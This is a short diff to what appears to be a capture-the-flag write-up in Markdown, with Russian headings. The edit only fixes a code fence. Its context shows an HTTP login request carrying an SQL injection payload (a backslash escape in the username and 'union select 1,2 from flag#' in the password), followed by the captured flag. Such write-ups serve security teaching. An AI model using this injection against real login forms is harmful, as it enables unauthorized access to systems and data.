@@ -28,8 +28,7 @@
 ```http
 POST /login HTTP/1.1
 username=%5c&password=union+select+1,2+from+flag#
-
----
+```
 
 
 Результат
@@ -40,3 +39,4 @@ username=%5c&password=union+select+1,2+from+flag#
 
 
 Flag: KCTF{0c259a70a089442a7e622d02bb5d911f}
+
